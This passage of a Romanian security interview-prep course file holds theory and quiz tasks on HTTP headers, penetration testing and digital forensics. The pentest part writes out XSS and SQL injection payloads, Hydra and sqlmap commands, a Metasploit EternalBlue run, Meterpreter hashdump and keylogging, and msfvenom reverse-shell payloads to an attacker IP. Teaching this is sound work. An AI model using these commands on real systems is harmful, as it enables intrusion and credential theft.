        explanation: "Permissions-Policy: camera=() interzice accesul la camera pentru pagina. Utila pentru a preveni abuzul iframe-urilor de la third-party la resurse sensibile.",
        difficulty: "medium"
      },
      {
        number: 14,
        name: "HTTP Parameter Pollution",
        question: "De ce HTTP Parameter Pollution e periculoasa?",
        options: [
          "Cauzeaza erori server",
          "Framework-uri diferite parseaza parametrii duplicati diferit — poate bypassa validari sau injecta valori neasteptate",
          "Creste traficul",
          "E un tip de DoS"
        ],
        answer: "Framework-uri diferite parseaza parametrii duplicati diferit — poate bypassa validari sau injecta valori neasteptate",
        explanation: "?sort=safe&sort=admin — PHP ia ultimul, Express ia array, ASP concateneaza. Daca validezi doar primul parametru dar procesezi ultimul = bypass.",
        difficulty: "hard"
      },
      {
        number: 15,
        name: "Helmet.js audit",
        question: "Scrie o configuratie Helmet.js care include CSP stricta (doar resurse 'self'), HSTS cu 1 an si dezactiveaza X-Powered-By.",
        type: "coding",
        language: "javascript",
        starterCode: "const express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\n// Configureaza Helmet cu:\n// - CSP: default-src 'self'\n// - HSTS: 1 an (365 zile)\n// - hidePoweredBy: true (dezactiveaza X-Powered-By)\napp.use(helmet(/* configuratie completa */));",
        options: [],
        answer: "",
        explanation: "helmet({ contentSecurityPolicy: { directives: { defaultSrc: [\"'self'\"] } }, hsts: { maxAge: 31536000 }, hidePoweredBy: true })",
        difficulty: "medium",
        expectedOutput: ""
      }
    ]
  },
  {
    slug: "penetration-testing",
    title: "23. Penetration Testing",
    order: 23,
    theory: [
      {
        order: 1,
        title: "Metodologia Penetration Testing — PTES si faze",
        content: "**Penetration Testing (pentest)** = simularea unui atac real pentru a descoperi vulnerabilitati inainte ca atacatorii reali sa o faca.\n\n**Tipuri de pentest:**\n- **Black Box:** pentesterul nu stie nimic despre tinta (simuleaza atacator extern)\n- **White Box:** acces complet la cod sursa, documentatie, credentiale (audit complet)\n- **Gray Box:** informatii partiale (cel mai realist si eficient)\n\n**PTES — Penetration Testing Execution Standard (7 faze):**\n\n```\n1. PRE-ENGAGEMENT\n   - Scop definit (IP ranges, domenii, aplicatii)\n   - Reguli angajament (ore de lucru, ce e permis)\n   - Contract legal + autorizatie scrisa (OBLIGATORIU)\n   - Emergency contacts\n\n2. INTELLIGENCE GATHERING (Reconnaissance)\n   - Pasiva: OSINT, WHOIS, DNS, Google Dorks\n   - Activa: scanare porturi, banner grabbing\n\n3. THREAT MODELING\n   - Identificare active valoroase\n   - Vectori de atac probabili\n\n4. VULNERABILITY ANALYSIS\n   - Scan automat (Nessus, OpenVAS)\n   - Analiza manuala (false positives removal)\n\n5. EXPLOITATION\n   - Demonstrarea impactului real\n   - Evitare daunelor (nu sterge date!)\n\n6. POST-EXPLOITATION\n   - Lateral movement, privilege escalation\n   - Evaluarea impactului real\n\n7. REPORTING\n   - Executive Summary (pentru management)\n   - Technical Findings (pentru echipa tehnica)\n   - Proof of Concept\n   - Remediere recomandata\n```\n\n**Interview tip:** Autorizatia scrisa e OBLIGATORIE. Fara autorizatie = infractiune penala (Computer Fraud and Abuse Act in SUA, lege similara in Romania)."
      },
      {
        order: 2,
        title: "Kali Linux — instrumentele esentiale",
        content: "**Kali Linux** e distributia standard pentru pentest — vine cu 600+ tool-uri preinstalate.\n\n```bash\n# NMAP — Network Mapper (cel mai important tool):\nnmap -sn 192.168.1.0/24           # Host discovery (ping sweep)\nnmap -sS -p 1-1000 192.168.1.1   # SYN scan (stealth), primele 1000 porturi\nnmap -sV -sC target.com          # Version detection + default scripts\nnmap -A -T4 target.com           # Agresiv: OS, versiuni, scripts, traceroute\nnmap --script vuln target.com    # Scripturi de vulnerabilitate\nnmap -p- --min-rate 5000 target  # Toate porturile, rapid\n\n# Output formats:\nnmap -oN output.txt target       # Normal\nnmap -oX output.xml target       # XML\nnmap -oG output.gnmap target     # Grepable\n\n# Gobuster — Directory/subdomain brute force:\ngobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt\ngobuster dns -d target.com -w /usr/share/wordlists/subdomains-top1million.txt\n\n# Nikto — Web server scanner:\nnikto -h https://target.com\n\n# Hydra — Credential brute force:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \"/login:username=^USER^&password=^PASS^:Invalid password\"\n\n# SQLMap — Automated SQL injection:\nsqlmap -u \"https://target.com/products?id=1\" --dbs\nsqlmap -u \"https://target.com/products?id=1\" -D dbname --tables\n\n# Netcat — The Swiss Army Knife:\nnc -lvnp 4444   # listener\nnc target.com 80  # conectare\n```\n\n**Interview tip:** Cunoaste diferenta: SYN scan (-sS) nu completeaza handshake TCP (mai stealth dar necesita root). Connect scan (-sT) completeaza handshake (nu necesita root)."
      },
      {
        order: 3,
        title: "Burp Suite si testarea aplicatiilor web",
        content: "**Burp Suite** e standardul de facto pentru testarea aplicatiilor web.\n\n**Module principale:**\n\n**Proxy** — intercepteaza si modifica request-uri HTTP:\n```\nBrowser → Burp Proxy (127.0.0.1:8080) → Server\n\nRequest interceptat:\nGET /api/user/profile?id=42 HTTP/1.1\nHost: target.com\nCookie: session=abc123\n\n# Modifici id=42 → id=43 pentru IDOR testing\n```\n\n**Repeater** — retrimite request-uri modificate:\n```http\n# Testezi XSS manual:\nGET /search?q=<script>alert(1)</script>\nGET /search?q=\"><img src=x onerror=alert(1)>\nGET /search?q=javascript:alert(document.cookie)\n\n# Testezi SQL Injection:\nGET /products?id=1'\nGET /products?id=1 OR 1=1\nGET /products?id=1 UNION SELECT null,username,password FROM users--\n```\n\n**Intruder** — automatizare atacuri:\n```\nTip Sniper: un singur payload pozitie\nTip Battering Ram: acelasi payload in toate pozitiile\nTip Pitchfork: payload-uri diferite in pozitii paralele (user+pass)\nTip Cluster Bomb: combinatii carteziene (brute force)\n```\n\n**Scanner (Pro)** — scanare automata:\n- Active scanning: trimite payload-uri, detecteaza XSS/SQLi/etc.\n- Passive scanning: analizeaza traficul fara payload-uri active\n\n**Extensions utile:**\n- **Logger++** — logging avansat\n- **Turbo Intruder** — brute force ultra-rapid\n- **Param Miner** — descopera parametri ascunsi\n\n**Interview tip:** Burp Suite Community e gratuit dar fara Active Scanner. Pro = ~450$/an. Alternativa open-source: OWASP ZAP."
      },
      {
        order: 4,
        title: "Metasploit Framework — exploitation si post-exploitation",
        content: "**Metasploit** e cel mai popular framework de exploitation.\n\n```bash\n# Pornire:\nmsfconsole\n\n# Structura unui exploit:\nuse exploit/windows/smb/ms17_010_eternalblue  # EternalBlue (WannaCry)\nshow options           # parametri necesari\nset RHOSTS 192.168.1.5  # target\nset LHOST 192.168.1.100  # attacker IP\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit  # sau: run\n\n# Meterpreter — post-exploitation shell avansat:\nmeterpreter> sysinfo          # info sistem\nmeterpreter> getuid           # user curent\nmeterpreter> getsystem        # privilege escalation\nmeterpreter> hashdump         # dump SAM (hashes parole Windows)\nmeterpreter> upload file.exe /tmp/  # upload fisier\nmeterpreter> download secret.txt    # download fisier\nmeterpreter> shell            # shell normal\nmeterpreter> migrate 1234     # migreaza in alt proces (evasion)\nmeterpreter> keyscan_start    # incepe keylogging\nmeterpreter> screenshot       # screenshot desktop\nmeterpreter> run post/multi/recon/local_exploit_suggester  # sugereaza LPE\n\n# Auxiliary modules — scanare:\nuse auxiliary/scanner/portscan/tcp\nuse auxiliary/scanner/smb/smb_version\nuse auxiliary/scanner/http/http_version\n\n# Generare payload cu msfvenom:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n    LHOST=192.168.1.100 LPORT=4444 \\\n    -f exe -o payload.exe\n\nmsfvenom -p linux/x64/meterpreter/reverse_tcp \\\n    LHOST=192.168.1.100 LPORT=4444 \\\n    -f elf -o payload.elf\n```\n\n**Interview tip:** Metasploit e pentru medii de test autorizate (CTF, lab, pentest cu contract). Cunoaste concepte: exploit vs payload, staged vs stageless, reverse vs bind shell."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "Pentest autorizare",
        question: "Ce este OBLIGATORIU inainte de a incepe orice penetration test?",
        options: [
          "Instalarea Kali Linux",
          "Autorizatia scrisa de la proprietarul sistemului — fara aceasta, pentesting e infractiune",
          "Un VPN",
          "Un raport preliminar"
        ],
        answer: "Autorizatia scrisa de la proprietarul sistemului — fara aceasta, pentesting e infractiune",
        explanation: "Legea informaticii (in Romania, Legea 161/2003) pedepseste accesul neautorizat la sisteme informatice. Autorizatia scrisa te protejaza legal.",
        difficulty: "easy"
      },
      {
        number: 2,
        name: "Nmap SYN scan",
        question: "De ce SYN scan (-sS) e considerat mai 'stealth' decat un Connect scan (-sT)?",
        options: [
          "E mai rapid",
          "SYN scan nu completeaza handshake-ul TCP (trimite RST dupa SYN-ACK) — multi firewall-uri si IDS-uri nu logheaza conexiuni incomplete",
          "Nu genereaza trafic",
          "E mai precis"
        ],
        answer: "SYN scan nu completeaza handshake-ul TCP (trimite RST dupa SYN-ACK) — multi firewall-uri si IDS-uri nu logheaza conexiuni incomplete",
        explanation: "Connect scan (-sT) completeaza handshake-ul complet — apare in loguri ca conexiune reala. SYN scan e mai discret dar necesita privilegii root/admin.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "Burp Intruder attack types",
        question: "Ce tip de atac Burp Intruder folosesti pentru brute force pe username si parola simultan?",
        options: [
          "Sniper",
          "Battering Ram",
          "Pitchfork — doua liste paralele (user[i] + pass[i])",
          "Cluster Bomb — produs cartezian din doua liste"
        ],
        answer: "Cluster Bomb — produs cartezian din doua liste",
        explanation: "Cluster Bomb: 10 useri x 1000 parole = 10.000 combinatii testate. Pitchfork: user1+pass1, user2+pass2 (liste perechi, nu combinatii).",
        difficulty: "medium"
      },
      {
        number: 4,
        name: "Meterpreter hashdump",
        question: "Ce face comanda hashdump in Meterpreter si ce se poate face cu rezultatele?",
        options: [
          "Cripteaza fisierele",
          "Extrage hash-urile NTLM ale parolelor din SAM (Windows) — pot fi sparte offline sau folosite in Pass-the-Hash",
          "Dezactiveaza firewall-ul",
          "Scoateaza drive-ul"
        ],
        answer: "Extrage hash-urile NTLM ale parolelor din SAM (Windows) — pot fi sparte offline sau folosite in Pass-the-Hash",
        explanation: "Hash-urile NTLM pot fi cracuite cu Hashcat/John the Ripper sau folosite direct in Pass-the-Hash attack pentru autentificare fara parola in text clar.",
        difficulty: "hard"
      },
      {
        number: 5,
        name: "Google dorks",
        question: "Ce este Google Dorking si cum e folosit in reconnaissance?",
        options: [
          "Un tip de SQL injection",
          "Folosirea operatorilor avansati Google (site:, filetype:, inurl:) pentru a gasi informatii sensibile indexate public",
          "Un atac DoS",
          "Un tool Kali Linux"
        ],
        answer: "Folosirea operatorilor avansati Google (site:, filetype:, inurl:) pentru a gasi informatii sensibile indexate public",
        explanation: "Exemple: filetype:sql site:target.com (baze de date expuse), inurl:admin site:target.com, \"password\" filetype:env site:github.com.",
        difficulty: "easy"
      },
      {
        number: 6,
        name: "Nmap scan scripting",
        question: "Scrie o comanda Nmap completa pentru a scana porturile 80, 443 si 8080 ale unui target, detectand versiunile serviciilor si rulând scripturile de vulnerabilitate.",
        type: "coding",
        language: "bash",
        starterCode: "# Scaneaza target.example.com:\n# - Porturile: 80, 443, 8080\n# - Detectie versiuni servicii\n# - Scripturi default + vulnerability\n# - Output in fisier output.txt",
        options: [],
        answer: "",
        explanation: "nmap -sV -p 80,443,8080 --script default,vuln -oN output.txt target.example.com",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "SQLmap basic",
        question: "Ce face SQLMap automat dupa identificarea unui parametru vulnerabil la SQL injection?",
        options: [
          "Sterge baza de date",
          "Enumereaza baze de date, tabele, coloane si poate extrage date — totul automatizat",
          "Instaleaza un backdoor",
          "Trimite un raport"
        ],
        answer: "Enumereaza baze de date, tabele, coloane si poate extrage date — totul automatizat",
        explanation: "SQLMap: --dbs (enumereaza DB-uri), -D dbname --tables (tabele), -T users --dump (extrage datele). Suporta boolean-based, error-based, time-based, UNION-based SQLi.",
        difficulty: "medium"
      },
      {
        number: 8,
        name: "Pentest report structure",
        question: "Ce sectiuni are un raport de pentest profesionist?",
        options: [
          "Doar lista de vulnerabilitati",
          "Executive Summary (business impact) + Technical Findings (CVE, CVSS, PoC, remediere) + Conclusions",
          "Doar recomandari de securitate",
          "Log-uri de Nmap"
        ],
        answer: "Executive Summary (business impact) + Technical Findings (CVE, CVSS, PoC, remediere) + Conclusions",
        explanation: "Executive Summary: pentru CEO/CISO fara jargon tehnic. Technical Findings: per vulnerabilitate — titlu, severitate CVSS, descriere, PoC, impact, remediere.",
        difficulty: "medium"
      },
      {
        number: 9,
        name: "Reverse vs bind shell",
        question: "Ce diferenta e intre un reverse shell si un bind shell?",
        options: [
          "Nu exista diferenta",
          "Reverse: victima se conecteaza la atacator (bypassa firewall); Bind: atacatorul se conecteaza la victima (blocat de firewall deseori)",
          "Bind shell e mai sigur",
          "Reverse shell e mai lent"
        ],
        answer: "Reverse: victima se conecteaza la atacator (bypassa firewall); Bind: atacatorul se conecteaza la victima (blocat de firewall deseori)",
        explanation: "Firewall-urile blocheaza conexiunile INBOUND de la exterior. Reverse shell: conexiunea iese din retea (OUTBOUND) — de obicei permisa.",
        difficulty: "medium"
      },
      {
        number: 10,
        name: "CVSS scoring",
        question: "Ce inseamna un scor CVSS de 9.8 (Critical)?",
        options: [
          "Vulnerabilitate minora",
          "Vulnerabilitate critica — usor exploatabila, fara autentificare, impact maxim asupra confidentialitatii/integritatii/disponibilitatii",
          "Necesita conditii speciale",
          "Afecteaza doar aplicatii web"
        ],
        answer: "Vulnerabilitate critica — usor exploatabila, fara autentificare, impact maxim asupra confidentialitatii/integritatii/disponibilitatii",
        explanation: "CVSS 9.0-10.0: Critical. Vectori: AV:N (Network), AC:L (Low complexity), PR:N (No privileges), UI:N (No user interaction) + maxim impact.",
        difficulty: "medium"
      },
      {
        number: 11,
        name: "Post-exploitation goals",
        question: "Ce obiective urmaresti in faza de post-exploitation?",
        options: [
          "Stergi log-urile si pleci",
          "Lateral movement, privilege escalation, persistenta, exfiltrarea datelor sensibile — demonstrezi impactul real",
          "Instalezi antivirus",
          "Remediezi vulnerabilitatile"
        ],
        answer: "Lateral movement, privilege escalation, persistenta, exfiltrarea datelor sensibile — demonstrezi impactul real",
        explanation: "Post-exploitation demonstreaza ce poate face un atacator REAL dupa ce a intrat. Lateral movement = alte sisteme din retea. Persistenta = backdoor.",
        difficulty: "medium"
      },
      {
        number: 12,
        name: "Gobuster usage",
        question: "Scrie o comanda Gobuster pentru a gasi directoare ascunse pe un site web folosind wordlist-ul common.txt.",
        type: "coding",
        language: "bash",
        starterCode: "# Scaneaza https://target.com\n# Cauta directoare cu wordlist-ul common.txt din dirb\n# Afiseaza codul de status HTTP\n# Extensii: php, html, txt\n# Hint: gobuster dir",
        options: [],
        answer: "",
        explanation: "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -s 200,204,301,302",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 13,
        name: "Staged vs stageless payload",
        question: "Ce diferenta e intre un payload staged si stageless in Metasploit?",
        options: [
          "Nu exista diferenta",
          "Staged: payload mic care descarca stage 2 de la C2 (windows/meterpreter/reverse_tcp); Stageless: tot codul intr-un singur executabil (windows/meterpreter_reverse_tcp)",
          "Stageless e mai sigur",
          "Staged functioneaza doar pe Windows"
        ],
        answer: "Staged: payload mic care descarca stage 2 de la C2 (windows/meterpreter/reverse_tcp); Stageless: tot codul intr-un singur executabil (windows/meterpreter_reverse_tcp)",
        explanation: "Staged: mai mic initial, necesita conexiune la C2. Stageless: mai mare dar autonom, bun cand conexiunea e instabila. Notatia: / = staged, _ = stageless.",
        difficulty: "hard"
      },
      {
        number: 14,
        name: "Passive vs active recon",
        question: "Ce diferentiaza reconnaissance pasiva de cea activa?",
        options: [
          "Pasiva e ilegala, activa e legala",
          "Pasiva nu contacteaza direct tinta (OSINT, WHOIS, Google); activa contacteaza direct tinta (scanare porturi, ping)",
          "Activa e mai lenta",
          "Nu exista diferenta practica"
        ],
        answer: "Pasiva nu contacteaza direct tinta (OSINT, WHOIS, Google); activa contacteaza direct tinta (scanare porturi, ping)",
        explanation: "Pasiva: niciun pachet nu ajunge la tinta — nu lasi urme. Activa: trimiti pachete, lasi urme in log-urile tintei. In pentest, pasiva e primul pas.",
        difficulty: "medium"
      },
      {
        number: 15,
        name: "msfvenom payload",
        question: "Genereaza cu msfvenom un payload ELF Linux pentru reverse shell Meterpreter catre 10.10.10.1:4444.",
        type: "coding",
        language: "bash",
        starterCode: "# Genereaza payload Linux (ELF) Meterpreter reverse TCP\n# LHOST: 10.10.10.1\n# LPORT: 4444\n# Output: shell.elf\n# Hint: msfvenom -p ... -f elf",
        options: [],
        answer: "",
        explanation: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf",
        difficulty: "medium",
        expectedOutput: ""
      }
    ]
  },
  {
    slug: "digital-forensics",
    title: "24. Forensics Digital",
    order: 24,
    theory: [
      {
        order: 1,
        title: "Principii fundamentale si Chain of Custody",
        content: "**Digital Forensics** = colectarea, prezervarea, analiza si prezentarea probelor digitale intr-un mod admisibil in instanta.\n\n**Principii fundamentale:**\n\n1. **Preserve before analyze** — faci o copie exacta (bit-by-bit) a probei si lucrezi pe copie\n2. **Minimize changes** — nu modifica proba originala\n3. **Document everything** — fiecare actiune e documentata (cand, cine, ce)\n4. **Chain of Custody** — trasabilitate completa a probei\n\n**Chain of Custody (Lanţul Custodiei):**\n```\nFormular Chain of Custody contine:\n- Descrierea probei (device, serial number, hash MD5/SHA256)\n- Cine a colectat-o (investigator, badge number)\n- Cand (data, ora exacta)\n- Unde (locatia fizica)\n- Fiecare transfer (cine a predat, cine a primit, cand, de ce)\n- Conditii de stocare\n\nOrice intrerupere a lantului = proba inadmisibila in instanta!\n```\n\n**Tipuri de probe digitale:**\n- **Volatile** (se pierd la oprire): RAM, procese, conexiuni retea, clipboard\n- **Non-volatile** (persista): HDD/SSD, USB, CD/DVD, email servers\n\n**Regula ordinii colectarii — RFC 3227:**\n```\n1. CPU registers, cache (ms)\n2. RAM (secunde/minute)\n3. Network state, conexiuni active\n4. Procese rulante\n5. Disk (ore)\n6. Backup-uri offline (zile/saptamani)\n```\n\n**Interview tip:** In real incident response, decizia de a opri sistemul vs a-l lasa pornit e cruciala — oprind il, pierzi volatilele; lasandu-l pornit, atacatorul poate sterge urme."
      },
      {
        order: 2,
        title: "Colectarea datelor volatile — Memory Forensics",
        content: "**Memory forensics** = analiza RAM-ului pentru a gasi procese, conexiuni, date in-memory.\n\n```bash\n# Captura memorie RAM — Linux:\nsudo avml /tmp/memory.lime  # avml (Azure, AWS tool)\n# sau:\ndd if=/dev/mem of=/tmp/mem.raw bs=4096  # partial (limitat de paging)\n\n# Captura cu LiME (Linux Memory Extractor):\ninsmod lime.ko \"path=/tmp/lime.dump format=lime\"\n\n# Windows — WinPmem:\nwinpmem_mini.exe memory.raw\n\n# Analiza cu Volatility 3 (standard industry):\npip install volatility3\n\n# Listeaza procesele:\nvol.py -f memory.raw windows.pslist    # lista plana\nvol.py -f memory.raw windows.pstree    # arborescenta (detectezi procese injected)\nvol.py -f memory.raw windows.cmdline   # argumentele proceselor\n\n# Conexiuni retea:\nvol.py -f memory.raw windows.netstat\n\n# DLL-uri per proces:\nvol.py -f memory.raw windows.dlllist --pid 1234\n\n# Detectare malware:\nvol.py -f memory.raw windows.malfind   # inject cod in procese legitime\nvol.py -f memory.raw windows.svcscan   # servicii Windows (inclusiv malware)\n\n# Extrage strings din memorie:\nstrings memory.raw | grep -i \"password\\|token\\|secret\" > strings.txt\n\n# Linux memory analysis:\nvol.py -f linux.raw linux.pslist\nvol.py -f linux.raw linux.bash   # bash history din memorie!\n```\n\n**Interview tip:** Volatility e tool-ul #1 pentru memory forensics. Intrebat frecvent: cum detectezi process injection cu malfind? (cauta regiuni de memorie executabile fara backing file)."
      },
      {
        order: 3,
        title: "Disk Imaging si File System Forensics",
        content: "**Disk imaging** = copie bit-by-bit a unui storage device (inclusiv spatii sterse/ascunse).\n\n```bash\n# dd — tool clasic pentru imaging:\ndd if=/dev/sda of=/tmp/disk.img bs=4M status=progress\n\n# Verifica integritatea cu hash:\nmd5sum /dev/sda > hash_original.md5\nmd5sum /tmp/disk.img  # trebuie sa fie identic!\n\n# dcfldd — dd cu hashing si progress:\ndcfldd if=/dev/sda of=disk.img hash=sha256 hashlog=hash.txt\n\n# FTK Imager (Windows) — GUI, format forensic E01:\n# Creeaza imagini in format E01 (Expert Witness Format)\n# Include metadata, hash automat, compresiie\n\n# Analiza imagine cu Autopsy (open-source, GUI):\n# - Analiza fisiere sterse\n# - Carving (recuperare fisiere fara filesystem metadata)\n# - Analiza browser history, email, documente Office\n# - Timeline de activitate\n\n# Sleuth Kit (CLI):\nmmls disk.img              # partition table\nfls -r disk.img -o 2048    # listeaza fisiere (inclusiv sterse cu * prefix)\nicat disk.img -o 2048 12   # extrage inode 12\n\n# Recuperare fisiere sterse cu photorec:\nphotorec disk.img\n\n# File carving manual cu Binwalk:\nbinwalk -e firmware.bin     # extrage fisiere embedded\nbinwalk --dd=\"png:png\" disk.img  # extrage PNG-uri\n\n# Analiza metadata fisiere:\nexiftool document.pdf  # creator, GPS coordinates, software\nstrings document.docx | grep -i \"author\\|creator\"\n```\n\n**Interview tip:** E01 (Expert Witness Format) e formatul forensic standard — include hash intern per segment, metadata investigator, compresie. Raw (dd) e simplu dar fara metadata."
      },
      {
        order: 4,
        title: "Log Analysis si Timeline Reconstruction",
        content: "**Log analysis** e esentiala pentru reconstructia unui incident.\n\n```bash\n# Loguri esentiale Linux:\ncat /var/log/auth.log        # autentificari SSH, sudo\ncat /var/log/syslog          # sistem general\ncat /var/log/apache2/access.log  # web server\ncat /var/log/secure          # (RHEL/CentOS)\njournalctl -u sshd -since \"2025-01-01\"  # systemd logs\n\n# Analiza loguri SSH brute force:\ngrep \"Failed password\" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head\n\n# Detecta login-uri reusit dupa brute force:\ngrep \"Accepted password\" /var/log/auth.log\n\n# Windows Event Logs (PowerShell):\nGet-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625} # Failed login\nGet-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} # Successful login\nGet-WinEvent -LogName Security | Where-Object {$_.Id -eq 4688} # Process creation\n\n# Event IDs importante:\n# 4624: Autentificare reusita\n# 4625: Autentificare esuata\n# 4720: Cont utilizator creat\n# 4732: User adaugat in grup\n# 4688: Proces creat (command line)\n\n# Timeline cu Plaso/log2timeline:\nlog2timeline.py timeline.plaso /mnt/evidence\npsort.py -o l2tcsv timeline.plaso > timeline.csv\n\n# Analiza Plaso in Excel sau Timesketch (GUI)\n\n# Bash history analysis:\ncat ~/.bash_history\ncat /root/.bash_history\n\n# Recently modified files:\nfind / -newer /tmp/reference_time -type f 2>/dev/null | sort\n\n# Files deleted in last 24h (Linux ext4):\ndebugfs -R 'lsdel' /dev/sda1\n```\n\n**Interview tip:** Windows Event ID 4688 (Process Creation) + Command Line logging e gold pentru incident response. Trebuie activat explicit in Group Policy."
      }
    ],
    tasks: [
      {
        number: 1,
        name: "Chain of custody",
        question: "De ce este Chain of Custody critica in forensics digital?",
        options: [
          "Accelereaza investigatia",
          "Orice intrerupere a lantului face proba inadmisibila in instanta — atacatorul isi poate cere achitarea",
          "E un formalism birocratic",
          "Protejeaza investigatorul de raspundere"
        ],
        answer: "Orice intrerupere a lantului face proba inadmisibila in instanta — atacatorul isi poate cere achitarea",
        explanation: "Chain of custody dovedeste ca proba nu a fost modificata. Fara ea, apararea poate argumenta ca datele au fost plantate sau modificate.",
        difficulty: "medium"
      },
      {
        number: 2,
        name: "Volatile data priority",
        question: "De ce este memoria RAM colectata inaintea imaginii de disk in forensics?",
        options: [
          "RAM e mai mare",
          "Datele volatile (RAM) se pierd la oprirea sistemului — contin procese, conexiuni, chei de criptare, parole in text clar",
          "Disk-ul e mai greu de imaginat",
          "RAM e mai usor de analizat"
        ],
        answer: "Datele volatile (RAM) se pierd la oprirea sistemului — contin procese, conexiuni, chei de criptare, parole in text clar",
        explanation: "In RAM poti gasi: chei de criptare BitLocker/VeraCrypt, parole in plaintext, procese malware, conexiuni retea active, clipboard.",
        difficulty: "medium"
      },
      {
        number: 3,
        name: "dd imaging command",
        question: "Scrie comanda dd completa pentru a crea o imagine forensica a disk-ului /dev/sdb in fisierul evidence.img, cu block size 4M si afisare progres.",
        type: "coding",
        language: "bash",
        starterCode: "# Creeaza imaginea bit-by-bit\n# Verifica integritatea cu hash MD5\n# Hint: dd, md5sum",
        options: [],
        answer: "",
        explanation: "dd if=/dev/sdb of=evidence.img bs=4M status=progress; md5sum /dev/sdb > original.md5; md5sum evidence.img > copy.md5; diff original.md5 copy.md5",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 4,
        name: "Volatility pslist",
        question: "Ce face comanda vol.py -f memory.raw windows.malfind?",
        options: [
          "Listeaza toate procesele",
          "Detecteaza procese sau regiuni de memorie suspecte — cod injectat fara backing file pe disk (indicator de malware)",
          "Extrage stringuri din memorie",
          "Analizeaza conexiunile retea"
        ],
        answer: "Detecteaza procese sau regiuni de memorie suspecte — cod injectat fara backing file pe disk (indicator de malware)",
        explanation: "malfind cauta regiuni de memorie cu permisiuni PAGE_EXECUTE_READWRITE fara un fisier PE pe disk — classic indicator de process injection (DLL injection, hollowing).",
        difficulty: "hard"
      },
      {
        number: 5,
        name: "Windows Event ID",
        question: "Ce reprezinta Windows Event ID 4625?",
        options: [
          "Logon reusit",
          "Logon esuat — tentativa de autentificare nereusite (brute force indicator)",
          "Cont creat",
          "Proces pornit"
        ],
        answer: "Logon esuat — tentativa de autentificare nereusite (brute force indicator)",
        explanation: "4624 = logon reusit, 4625 = logon esuat, 4720 = cont creat, 4688 = proces creat. 4625 repetat rapid = brute force.",
        difficulty: "easy"
      },
      {
        number: 6,
        name: "Log analysis bash",
        question: "Scrie o comanda bash care numara top 10 IP-uri care au incercat autentificari SSH esuate din /var/log/auth.log.",
        type: "coding",
        language: "bash",
        starterCode: "# Analizeaza /var/log/auth.log\n# Gaseste liniile cu \"Failed password\"\n# Extrage IP-urile (coloana 11 cu awk)\n# Sorteaza si numara\n# Afiseaza top 10\n# Hint: grep, awk, sort, uniq -c, head",
        options: [],
        answer: "",
        explanation: "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 7,
        name: "File carving",
        question: "Ce este file carving in forensics digital?",
        options: [
          "Taierea fisierelor mari",
          "Recuperarea fisierelor sterse sau fragmente de fisiere bazandu-se pe headere/footer-uri de fisier (magic bytes) — fara filesystem metadata",
          "Criptarea fisierelor",
          "Compresia imaginilor forensice"
        ],
        answer: "Recuperarea fisierelor sterse sau fragmente de fisiere bazandu-se pe headere/footer-uri de fisier (magic bytes) — fara filesystem metadata",
        explanation: "JPEG incepe cu FF D8 FF. PDF cu %PDF. Carving cauta aceste secvente direct in spatiul brut al disk-ului. Tool-uri: photorec, Binwalk, Foremost.",
        difficulty: "medium"
      },
      {
        number: 8,
        name: "EXIF metadata",
        question: "Ce informatii sensibile pot contine metadatele EXIF ale unui fisier imagine?",
        options: [
          "Doar dimensiunile imaginii",
          "GPS coordinates, device model, software, timestamp — poate dezvalui locatia fotografului si dispozitivul",
          "Parole",
          "Nimic util in investigatii"
        ],
        answer: "GPS coordinates, device model, software, timestamp — poate dezvalui locatia fotografului si dispozitivul",
        explanation: "Exemple reale: McAfee a postat poze din casuta lui pe Twitter — GPS EXIF i-a dezvaluit locatia. Tool: exiftool document.jpg",
        difficulty: "medium"
      },
      {
        number: 9,
        name: "Volatility memory analysis",
        question: "Scrie comenzile Volatility 3 pentru: listarea proceselor, conexiunile de retea si stringuri din memorie.",
        type: "coding",
        language: "bash",
        starterCode: "# Fisierul de memorie: memory.raw (Windows)\n# 1. Listeaza procesele\n# 2. Afiseaza conexiunile de retea\n# 3. Cauta stringul 'password' in memorie\n# Hint: vol.py -f memory.raw windows.<plugin>",
        options: [],
        answer: "",
        explanation: "vol.py -f memory.raw windows.pslist; vol.py -f memory.raw windows.netstat; strings memory.raw | grep -i 'password'",
        difficulty: "medium",
        expectedOutput: ""
      },
      {
        number: 10,
        name: "E01 format",
        question: "De ce E01 (Expert Witness Format) e preferat fata de raw dd in investigatii forensice?",
        options: [
          "E mai rapid la creare",
          "Include hash intern per segment (integritate), metadata investigator, compresie si este formatul acceptat de instrumente forensice standard",
          "Ocupa mai putin spatiu",
          "Nu exista diferenta tehnica"
        ],
        answer: "Include hash intern per segment (integritate), metadata investigator, compresie si este formatul acceptat de instrumente forensice standard",
        explanation: "E01: fiecare segment are hash intern (detecteaza coruptie), include case info, acceptat de FTK/EnCase/Autopsy. Raw (dd): simplu, nu include metadata.",
        difficulty: "medium"
      },
      {
        number: 11,
        name: "Timeline reconstruction",
        question: "Ce este analiza timeline in forensics si ce tool o faciliteaza?",
        options: [
          "Un grafic de performanta",
          "Reconstructia cronologica a tuturor evenimentelor (fisiere accesate/modificate, log-uri, procese) — tool: Plaso/log2timeline + Timesketch",
          "Analiza codului sursa",
          "Monitorizarea retelei"
        ],
        answer: "Reconstructia cronologica a tuturor evenimentelor (fisiere accesate/modificate, log-uri, procese) — tool: Plaso/log2timeline + Timesketch",
        explanation: "Timeline analiza coreleaza timestamps din multiple surse (filesystem, registry, log-uri) pentru a intelege ordinea exacta a actiunilor unui atacator.",
        difficulty: "medium"
      },
      {
        number: 12,
